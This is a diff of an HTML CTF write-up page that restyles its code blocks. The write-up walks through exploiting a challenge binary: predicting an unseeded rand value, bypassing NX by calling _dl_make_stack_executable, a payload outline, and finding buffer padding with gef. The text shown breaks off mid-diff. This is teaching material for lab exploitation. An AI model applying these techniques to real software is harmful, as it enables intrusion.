@@ -11,9 +11,80 @@
       span.underline{text-decoration: underline;}
       div.column{display: inline-block; vertical-align: top; width: 50%;}
   </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
   <!--[if lt IE 9]>
     <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
   <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
       <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
       <script type="text/javascript" src="../../js/common.js"></script>
 </head>
@@ -25,146 +96,146 @@
 </header>
 <h2 id="guess-the-number">Guess the number</h2>
 <p>We could brute-force to guess the number, or since function <code>get_random</code> takes a number generated with unseed rand as return, so we could load <code>libc</code> and call <code>rand</code> to generate such a number.</p>
-<pre><code>num = (libc.rand() % 100) + 1</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1"></a>num <span class="op">=</span> (libc.rand() <span class="op">%</span> <span class="dv">100</span>) <span class="op">+</span> <span class="dv">1</span></span></code></pre></div>
 <h2 id="make-stack-executable">Make stack executable</h2>
-<pre><code>checksec --file ./vuln
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./vuln</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a><span class="ex">checksec</span> --file ./vuln</span>
+<span id="cb2-2"><a href="#cb2-2"></a><span class="ex">RELRO</span>           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span>
+<span id="cb2-3"><a href="#cb2-3"></a><span class="ex">Partial</span> RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./vuln</span></code></pre></div>
 <p>Since the program is NX enabled, we can’t simply execute code from stack. To inject and run shellcode we need to make the stack executable.</p>
 <p>Run <code>nm</code> on the program, we found an interesting function <code>_dl_make_stack_executable</code>, which allow us to set permission on stack.</p>
-<pre><code>...
-0000000000480860 T _dl_make_stack_executable
-...</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb3-1"><a href="#cb3-1"></a>...</span>
+<span id="cb3-2"><a href="#cb3-2"></a><span class="dv">0000000000480860</span> T _dl_make_stack_executable</span>
+<span id="cb3-3"><a href="#cb3-3"></a>...</span></code></pre></div>
 <p>Disassamble with <code>radare2</code>.</p>
-<pre><code>$ r2 vuln
- -- Your problems are solved in an abandoned branch somewhere
- [0x00400a40]&gt; pd $s</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1"></a>$ <span class="ex">r2</span> vuln</span>
+<span id="cb4-2"><a href="#cb4-2"></a> <span class="ex">--</span> Your problems are solved in an abandoned branch somewhere</span>
+<span id="cb4-3"><a href="#cb4-3"></a> [<span class="ex">0x00400a40</span>]<span class="op">&gt;</span> pd <span class="va">$s</span></span></code></pre></div>
 <p><code>_dl_make_stack_executable</code> takes <code>__libc_stack_end</code> as parameter and call <code>mprotect</code> with parameter <code>__stack_prot</code>.</p>
-<pre><code>            ;-- _dl_make_stack_executable:
-            0x00480860      488b3591a923.  mov rsi, qword [obj._dl_pagesize] ; [0x6bb1f8:8]=0x1000
-            0x00480867      53             push rbx
-            0x00480868      4889fb         mov rbx, rdi
-            0x0048086b      488b17         mov rdx, qword [rdi]
-            0x0048086e      4889f7         mov rdi, rsi
-            0x00480871      48f7df         neg rdi
-            0x00480874      4821d7         and rdi, rdx
-            0x00480877      483b15329223.  cmp rdx, qword [obj.__libc_stack_end] ; [0x6b9ab0:8]=0
-            0x0048087e      7520           jne 0x4808a0
-            0x00480880      8b156a962300   mov edx, dword [obj.__stack_prot] ; [0x6b9ef0:4]=0x1000000
-            0x00480886      e8f5abfcff     call sym.__mprotect
-            0x0048088b      85c0           test eax, eax
-            0x0048088d      7521           jne 0x4808b0
-            0x0048088f      48c703000000.  mov qword [rbx], 0
-            0x00480896      830d4ba92300.  or dword [obj._dl_stack_flags], 1 ; [0x6bb1e8:4]=7
-            0x0048089d      5b             pop rbx
-            0x0048089e      c3             ret</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb5-1"><a href="#cb5-1"></a>            <span class="co">;-- _dl_make_stack_executable:</span></span>
+<span id="cb5-2"><a href="#cb5-2"></a><span class="bn">            0x00480860      </span>488b3591a923.  <span class="bu">mov</span> <span class="kw">rsi</span>, <span class="dt">qword</span> [obj._dl_pagesize] <span class="co">; [0x6bb1f8:8]=0x1000</span></span>
+<span id="cb5-3"><a href="#cb5-3"></a><span class="bn">            0x00480867      </span><span class="dv">53</span>             <span class="bu">push</span> <span class="kw">rbx</span></span>
+<span id="cb5-4"><a href="#cb5-4"></a><span class="bn">            0x00480868      </span>4889fb         <span class="bu">mov</span> <span class="kw">rbx</span>, <span class="kw">rdi</span></span>
+<span id="cb5-5"><a href="#cb5-5"></a><span class="bn">            0x0048086b      </span>488b17         <span class="bu">mov</span> <span class="kw">rdx</span>, <span class="dt">qword</span> [<span class="kw">rdi</span>]</span>
+<span id="cb5-6"><a href="#cb5-6"></a><span class="bn">            0x0048086e      </span>4889f7         <span class="bu">mov</span> <span class="kw">rdi</span>, <span class="kw">rsi</span></span>
+<span id="cb5-7"><a href="#cb5-7"></a><span class="bn">            0x00480871      </span>48f7df         <span class="bu">neg</span> <span class="kw">rdi</span></span>
+<span id="cb5-8"><a href="#cb5-8"></a><span class="bn">            0x00480874      </span>4821d7         <span class="bu">and</span> <span class="kw">rdi</span>, <span class="kw">rdx</span></span>
+<span id="cb5-9"><a href="#cb5-9"></a><span class="bn">            0x00480877      </span>483b15329223.  <span class="bu">cmp</span> <span class="kw">rdx</span>, <span class="dt">qword</span> [obj.__libc_stack_end] <span class="co">; [0x6b9ab0:8]=0</span></span>
+<span id="cb5-10"><a href="#cb5-10"></a><span class="bn">            0x0048087e      </span><span class="dv">7520</span>           <span class="bu">jne</span><span class="bn"> 0x4808a0</span></span>
+<span id="cb5-11"><a href="#cb5-11"></a><span class="bn">            0x00480880      </span>8b156a962300   <span class="bu">mov</span> <span class="kw">edx</span>, <span class="dt">dword</span> [obj.__stack_prot] <span class="co">; [0x6b9ef0:4]=0x1000000</span></span>
+<span id="cb5-12"><a href="#cb5-12"></a><span class="bn">            0x00480886      </span>e8f5abfcff     <span class="bu">call</span> sym.__mprotect</span>
+<span id="cb5-13"><a href="#cb5-13"></a><span class="bn">            0x0048088b      </span>85c0           <span class="bu">test</span> <span class="kw">eax</span>, <span class="kw">eax</span></span>
+<span id="cb5-14"><a href="#cb5-14"></a><span class="bn">            0x0048088d      </span><span class="dv">7521</span>           <span class="bu">jne</span><span class="bn"> 0x4808b0</span></span>
+<span id="cb5-15"><a href="#cb5-15"></a><span class="bn">            0x0048088f      </span>48c703000000.  <span class="bu">mov</span> <span class="dt">qword</span> [<span class="kw">rbx</span>], <span class="dv">0</span></span>
+<span id="cb5-16"><a href="#cb5-16"></a><span class="bn">            0x00480896      </span>830d4ba92300.  <span class="bu">or</span> <span class="dt">dword</span> [obj._dl_stack_flags], <span class="dv">1</span> <span class="co">; [0x6bb1e8:4]=7</span></span>
+<span id="cb5-17"><a href="#cb5-17"></a><span class="bn">            0x0048089d      </span>5b             <span class="bu">pop</span> <span class="kw">rbx</span></span>
+<span id="cb5-18"><a href="#cb5-18"></a><span class="bn">            0x0048089e      </span>c3             <span class="bu">ret</span></span></code></pre></div>
 <p>We need to set <code>__stack_prot</code> to <em>7</em>, meaning <em>PROT_READ|PROT_WRITE|PROT_EXEC</em>, and then call <code>_dl_make_stack_executable</code> with address of <code>__libc_stack_end</code> to make stack executable.</p>
-<pre><code>#define PROT_READ  0x1    /* page can be read */
-#define PROT_WRITE  0x2   /* page can be written */
-#define PROT_EXEC 0x4     /* page can be executed */</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1"></a><span class="pp">#define PROT_READ  0x1    </span><span class="co">/* page can be read */</span></span>
+<span id="cb6-2"><a href="#cb6-2"></a><span class="pp">#define PROT_WRITE  0x2   </span><span class="co">/* page can be written */</span></span>
+<span id="cb6-3"><a href="#cb6-3"></a><span class="pp">#define PROT_EXEC 0x4     </span><span class="co">/* page can be executed */</span></span></code></pre></div>
 <p>So the payload would be <code>padding + set __stack_prot to 7 + set rdi to __libc_stack_end + call _dl_make_stack_executable + push shellcode</code>.</p>
 <h2 id="find-out-padding">Find out padding</h2>
 <p>Set a breakpoint in main and run the program.</p>
-<pre><code>gef➤  break main
-gef➤  r</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1"></a><span class="ex">gef</span>➤  break main</span>
+<span id="cb7-2"><a href="#cb7-2"></a><span class="ex">gef</span>➤  r</span></code></pre></div>
 <p>Now try to call <code>win</code> with generated patter to cause segfault.</p>
-<pre><code>gef➤  pattern create 150                                                                                                                     [58/1898]
-[+] Generating a pattern of 150 bytes                                                                                                                 
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
-[+] Saved as &#39;$_gef0&#39;                                                      
-gef➤  call (void*)win()                                                     
-New winner!                                                                
-Name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaa
-saaaaa
-Congrats aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaa
-aaasaaaaa
-
-
-
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000400c8b in win ()
-[ Legend: Modified register | Code | Heap | Stack | String ]
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
-$rax   : 0xa2              
-$rbx   : 0x00000000006ba580  →  0x00000000fbad2288
-$rcx   : 0x0               
-$rdx   : 0x00000000006bcdf0  →  0x0000000000000000
-$rsp   : 0x00007fffffffdba8  →  0x6161616161616170 (&quot;paaaaaaa&quot;?)
-$rbp   : 0x616161616161616f (&quot;oaaaaaaa&quot;?)
-$rsi   : 0x0               
-$rdi   : 0x1               
-$rip   : 0x0000000000400c8b  →  &lt;win+75&gt; ret 
-$r8    : 0x0               
-$r9    : 0xa2           
-$r10   : 0xffffff69                                                                                                                          [30/1898]
-$r11   : 0x246             
-$r12   : 0x00000000006bbce0  →  0x0000000000000000
-$r13   : 0x00000000006bc0a0  →  0x0000000000000000
-$r14   : 0x00000000006bc0a0  →  0x0000000000000000
-$r15   : 0x167             
-$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffdba8│+0x0000: 0x6161616161616170   ← $rsp
-0x00007fffffffdbb0│+0x0008: 0x6161616161616171
-0x00007fffffffdbb8│+0x0010: 0xcc61616161616172
-0x00007fffffffdbc0│+0x0018: &quot;saaaaa\n&quot;
-0x00007fffffffdbc8│+0x0020: 0x000000006037a800
-0x00007fffffffdbd0│+0x0028: 0x0000000010d44792
-0x00007fffffffdbd8│+0x0030: 0x000000000041446d  →  &lt;_IO_new_file_write+45&gt; test rax, rax
-0x00007fffffffdbe0│+0x0038: 0x0000000010d44792
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-     0x400c84 &lt;win+68&gt;         call   0x410010 &lt;printf&gt;
-     0x400c89 &lt;win+73&gt;         nop    
-     0x400c8a &lt;win+74&gt;         leave  
- →   0x400c8b &lt;win+75&gt;         ret    
-[!] Cannot disassemble from $PC
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: &quot;vuln&quot;, stopped 0x400c8b in win (), reason: SIGSEGV
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x400c8b → win()
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-The program being debugged was signaled while in a function called from GDB.
-GDB remains in the frame where the signal was received.                                                                                       [1/1898]
-To change this behavior use &quot;set unwindonsignal on&quot;.
-Evaluation of the expression containing the function
-(win) will be abandoned.
-When the function is done executing, GDB will silently stop.</code></pre>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1"></a><span class="ex">gef</span>➤  pattern create 150                                                                                                                     [58/1898]</span>
+<span id="cb8-2"><a href="#cb8-2"></a>[<span class="ex">+</span>] Generating a pattern of 150 bytes                                                                                                                 </span>
+<span id="cb8-3"><a href="#cb8-3"></a><span class="ex">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa</span></span>
+<span id="cb8-4"><a href="#cb8-4"></a>[<span class="ex">+</span>] Saved as <span class="st">&#39;$_gef0&#39;</span>                                                      </span>
+<span id="cb8-5"><a href="#cb8-5"></a><span class="ex">gef</span>➤  call (void*)<span class="fu">win()</span>                                                     </span>
+<span id="cb8-6"><a href="#cb8-6"></a><span class="ex">New</span> winner!                                                                </span>
+<span id="cb8-7"><a href="#cb8-7"></a><span class="ex">Name?</span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaa</span>
+<span id="cb8-8"><a href="#cb8-8"></a><span class="ex">saaaaa</span></span>
+<span id="cb8-9"><a href="#cb8-9"></a><span class="ex">Congrats</span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaa</span>
+<span id="cb8-10"><a href="#cb8-10"></a><span class="ex">aaasaaaaa</span></span>
+<span id="cb8-11"><a href="#cb8-11"></a></span>
+<span id="cb8-12"><a href="#cb8-12"></a></span>
+<span id="cb8-13"><a href="#cb8-13"></a></span>
+<span id="cb8-14"><a href="#cb8-14"></a><span class="ex">Program</span> received signal SIGSEGV, Segmentation fault.</span>
+<span id="cb8-15"><a href="#cb8-15"></a><span class="ex">0x0000000000400c8b</span> in win ()</span>
+<span id="cb8-16"><a href="#cb8-16"></a><span class="bu">[</span> Legend: Modified register | Code | Heap | Stack | String<span class="bu"> ]</span></span>
+<span id="cb8-17"><a href="#cb8-17"></a>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="ex">registers</span> ────</span>
+<span id="cb8-18"><a href="#cb8-18"></a><span class="va">$rax</span>   <span class="bu">:</span> 0xa2              </span>
+<span id="cb8-19"><a href="#cb8-19"></a><span class="va">$rbx</span>   <span class="bu">:</span> 0x00000000006ba580  →  0x00000000fbad2288</span>
+<span id="cb8-20"><a href="#cb8-20"></a><span class="va">$rcx</span>   <span class="bu">:</span> 0x0               </span>
+<span id="cb8-21"><a href="#cb8-21"></a><span class="va">$rdx</span>   <span class="bu">:</span> 0x00000000006bcdf0  →  0x0000000000000000</span>
+<span id="cb8-22"><a href="#cb8-22"></a><span class="va">$rsp</span>   <span class="bu">:</span> 0x00007fffffffdba8  →  0x6161616161616170 (<span class="st">&quot;paaaaaaa&quot;</span>?)</span>
+<span id="cb8-23"><a href="#cb8-23"></a><span class="va">$rbp</span>   <span class="bu">:</span> 0x616161616161616f (<span class="st">&quot;oaaaaaaa&quot;</span>?)</span>
+<span id="cb8-24"><a href="#cb8-24"></a><span class="va">$rsi</span>   <span class="bu">:</span> 0x0               </span>
+<span id="cb8-25"><a href="#cb8-25"></a><span class="va">$rdi</span>   <span class="bu">:</span> 0x1               </span>
+<span id="cb8-26"><a href="#cb8-26"></a><span class="va">$rip</span>   <span class="bu">:</span> 0x0000000000400c8b  →  <span class="op">&lt;</span>win+<span class="op">75&gt;</span> ret </span>
+<span id="cb8-27"><a href="#cb8-27"></a><span class="va">$r8</span>    <span class="bu">:</span> 0x0               </span>
+<span id="cb8-28"><a href="#cb8-28"></a><span class="va">$r9</span>    <span class="bu">:</span> 0xa2           </span>
+<span id="cb8-29"><a href="#cb8-29"></a><span class="va">$r10</span>   <span class="bu">:</span> 0xffffff69                                                                                                                          [30/1898]</span>
+<span id="cb8-30"><a href="#cb8-30"></a><span class="va">$r11</span>   <span class="bu">:</span> 0x246             </span>
+<span id="cb8-31"><a href="#cb8-31"></a><span class="va">$r12</span>   <span class="bu">:</span> 0x00000000006bbce0  →  0x0000000000000000</span>
+<span id="cb8-32"><a href="#cb8-32"></a><span class="va">$r13</span>   <span class="bu">:</span> 0x00000000006bc0a0  →  0x0000000000000000</span>
+<span id="cb8-33"><a href="#cb8-33"></a><span class="va">$r14</span>   <span class="bu">:</span> 0x00000000006bc0a0  →  0x0000000000000000</span>
+<span id="cb8-34"><a href="#cb8-34"></a><span class="va">$r15</span>   <span class="bu">:</span> 0x167             </span>
+<span id="cb8-35"><a href="#cb8-35"></a><span class="va">$eflags</span>: [<span class="ex">zero</span> carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]</span>
+<span id="cb8-36"><a href="#cb8-36"></a><span class="va">$cs</span>: <span class="ex">0x0033</span> <span class="va">$ss</span>: 0x002b <span class="va">$ds</span>: 0x0000 <span class="va">$es</span>: 0x0000 <span class="va">$fs</span>: 0x0000 <span class="va">$gs</span>: 0x0000 </span>
+<span id="cb8-37"><a href="#cb8-37"></a>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="ex">stack</span> ────</span>
+<span id="cb8-38"><a href="#cb8-38"></a><span class="ex">0x00007fffffffdba8</span>│+0x0000: 0x6161616161616170   ← <span class="va">$rsp</span></span>
+<span id="cb8-39"><a href="#cb8-39"></a><span class="ex">0x00007fffffffdbb0</span>│+0x0008: 0x6161616161616171</span>
+<span id="cb8-40"><a href="#cb8-40"></a><span class="ex">0x00007fffffffdbb8</span>│+0x0010: 0xcc61616161616172</span>
+<span id="cb8-41"><a href="#cb8-41"></a><span class="ex">0x00007fffffffdbc0</span>│+0x0018: <span class="st">&quot;saaaaa\n&quot;</span></span>
+<span id="cb8-42"><a href="#cb8-42"></a><span class="ex">0x00007fffffffdbc8</span>│+0x0020: 0x000000006037a800</span>
+<span id="cb8-43"><a href="#cb8-43"></a><span class="ex">0x00007fffffffdbd0</span>│+0x0028: 0x0000000010d44792</span>
+<span id="cb8-44"><a href="#cb8-44"></a><span class="ex">0x00007fffffffdbd8</span>│+0x0030: 0x000000000041446d  →  <span class="op">&lt;</span>_IO_new_file_write+<span class="op">45&gt;</span> test rax, rax</span>
+<span id="cb8-45"><a href="#cb8-45"></a><span class="ex">0x00007fffffffdbe0</span>│+0x0038: 0x0000000010d44792</span>
+<span id="cb8-46"><a href="#cb8-46"></a>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="ex">code</span>:x86:64 ────</span>
+<span id="cb8-47"><a href="#cb8-47"></a>     <span class="ex">0x400c84</span> <span class="op">&lt;</span>win+<span class="op">68&gt;</span>         call   0x410010 <span class="op">&lt;</span>printf<span class="op">&gt;</span></span>
+<span id="cb8-48"><a href="#cb8-48"></a>     <span class="ex">0x400c89</span> <span class="op">&lt;</span>win+<span class="op">73&gt;</span>         nop    </span>
+<span id="cb8-49"><a href="#cb8-49"></a>     <span class="ex">0x400c8a</span> <span class="op">&lt;</span>win+<span class="op">74&gt;</span>         leave  </span>
+<span id="cb8-50"><a href="#cb8-50"></a> →   <span class="ex">0x400c8b</span> <span class="op">&lt;</span>win+<span class="op">75&gt;</span>         ret    </span>
+<span id="cb8-51"><a href="#cb8-51"></a>[!] <span class="ex">Cannot</span> disassemble from <span class="va">$PC</span></span>
+<span id="cb8-52"><a href="#cb8-52"></a>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="ex">threads</span> ────</span>
+<span id="cb8-53"><a href="#cb8-53"></a>[#<span class="ex">0</span>] Id 1, Name: <span class="st">&quot;vuln&quot;</span>, stopped 0x400c8b in win (), <span class="ex">reason</span>: SIGSEGV</span>
+<span id="cb8-54"><a href="#cb8-54"></a>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="ex">trace</span> ────</span>
+<span id="cb8-55"><a href="#cb8-55"></a>[#<span class="ex">0</span>] 0x400c8b → win()</span>
+<span id="cb8-56"><a href="#cb8-56"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb8-57"><a href="#cb8-57"></a><span class="ex">The</span> program being debugged was signaled while in a function called from GDB.</span>
+<span id="cb8-58"><a href="#cb8-58"></a><span class="ex">GDB</span> remains in the frame where the signal was received.                                                                                       [1/1898]</span>
+<span id="cb8-59"><a href="#cb8-59"></a><span class="ex">To</span> change this behavior use <span class="st">&quot;set unwindonsignal on&quot;</span>.</span>
+<span id="cb8-60"><a href="#cb8-60"></a><span class="ex">Evaluation</span> of the expression containing the function</span>
+<span id="cb8-61"><a href="#cb8-61"></a><span class="kw">(</span><span class="ex">win</span><span class="kw">)</span> <span class="ex">will</span> be abandoned.</span>
+<span id="cb8-62"><a href="#cb8-62"></a><span class="ex">When</span> the function is done executing, GDB will silently stop.</span></code></pre></div>
 <p>Check the registers, noticed the pattern in <code>$rsp</code>. Search the pattern and find out padding is 120.</p>
-<pre><code>gef➤  registers 
-$rax   : 0xa2              
-$rbx   : 0x00000000006ba580  →  0x00000000fbad2288
-$rcx   : 0x0               
-$rdx   : 0x00000000006bcdf0  →  0x0000000000000000
-$rsp   : 0x00007fffffffdba8  →  0x6161616161616170 (&quot;paaaaaaa&quot;?)
-$rbp   : 0x616161616161616f (&quot;oaaaaaaa&quot;?)
-$rsi   : 0x0               
-$rdi   : 0x1               
-$rip   : 0x0000000000400c8b  →  &lt;win+75&gt; ret 
-$r8    : 0x0               
-$r9    : 0xa2              
-$r10   : 0xffffff69        
-$r11   : 0x246             
-$r12   : 0x00000000006bbce0  →  0x0000000000000000
-$r13   : 0x00000000006bc0a0  →  0x0000000000000000
-$r14   : 0x00000000006bc0a0  →  0x0000000000000000
-$r15   : 0x167             
-$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
-gef➤  pattern search paaaaaaa
-[+] Searching &#39;paaaaaaa&#39;
-[+] Found at offset 113 (little-endian search) likely
-[+] Found at offset 120 (big-endian search) 
-gef➤ </code></pre>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1"></a><span class="ex">gef</span>➤  registers </span>
+<span id="cb9-2"><a href="#cb9-2"></a><span class="va">$rax</span>   <span class="bu">:</span> 0xa2              </span>
+<span id="cb9-3"><a href="#cb9-3"></a><span class="va">$rbx</span>   <span class="bu">:</span> 0x00000000006ba580  →  0x00000000fbad2288</span>
+<span id="cb9-4"><a href="#cb9-4"></a><span class="va">$rcx</span>   <span class="bu">:</span> 0x0               </span>
+<span id="cb9-5"><a href="#cb9-5"></a><span class="va">$rdx</span>   <span class="bu">:</span> 0x00000000006bcdf0  →  0x0000000000000000</span>
+<span id="cb9-6"><a href="#cb9-6"></a><span class="va">$rsp</span>   <span class="bu">:</span> 0x00007fffffffdba8  →  0x6161616161616170 (<span class="st">&quot;paaaaaaa&quot;</span>?)</span>
+<span id="cb9-7"><a href="#cb9-7"></a><span class="va">$rbp</span>   <span class="bu">:</span> 0x616161616161616f (<span class="st">&quot;oaaaaaaa&quot;</span>?)</span>
+<span id="cb9-8"><a href="#cb9-8"></a><span class="va">$rsi</span>   <span class="bu">:</span> 0x0               </span>
+<span id="cb9-9"><a href="#cb9-9"></a><span class="va">$rdi</span>   <span class="bu">:</span> 0x1               </span>
+<span id="cb9-10"><a href="#cb9-10"></a><span class="va">$rip</span>   <span class="bu">:</span> 0x0000000000400c8b  →  <span class="op">&lt;</span>win+<span class="op">75&gt;</span> ret </span>
+<span id="cb9-11"><a href="#cb9-11"></a><span class="va">$r8</span>    <span class="bu">:</span> 0x0               </span>
+<span id="cb9-12"><a href="#cb9-12"></a><span class="va">$r9</span>    <span class="bu">:</span> 0xa2              </span>
+<span id="cb9-13"><a href="#cb9-13"></a><span class="va">$r10</span>   <span class="bu">:</span> 0xffffff69        </span>
+<span id="cb9-14"><a href="#cb9-14"></a><span class="va">$r11</span>   <span class="bu">:</span> 0x246             </span>
+<span id="cb9-15"><a href="#cb9-15"></a><span class="va">$r12</span>   <span class="bu">:</span> 0x00000000006bbce0  →  0x0000000000000000</span>
+<span id="cb9-16"><a href="#cb9-16"></a><span class="va">$r13</span>   <span class="bu">:</span> 0x00000000006bc0a0  →  0x0000000000000000</span>
+<span id="cb9-17"><a href="#cb9-17"></a><span class="va">$r14</span>   <span class="bu">:</span> 0x00000000006bc0a0  →  0x0000000000000000</span>
+<span id="cb9-18"><a href="#cb9-18"></a><span class="va">$r15</span>   <span class="bu">:</span> 0x167             </span>
+<span id="cb9-19"><a href="#cb9-19"></a><span class="va">$eflags</span>: [<span class="ex">zero</span> carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]</span>
+<span id="cb9-20"><a href="#cb9-20"></a><span class="va">$cs</span>: <span class="ex">0x0033</span> <span class="va">$ss</span>: 0x002b <span class="va">$ds</span>: 0x0000 <span class="va">$es</span>: 0x0000 <span class="va">$fs</span>: 0x0000 <span class="va">$gs</span>: 0x0000 </span>
+<span id="cb9-21"><a href="#cb9-21"></a><span class="ex">gef</span>➤  pattern search paaaaaaa</span>
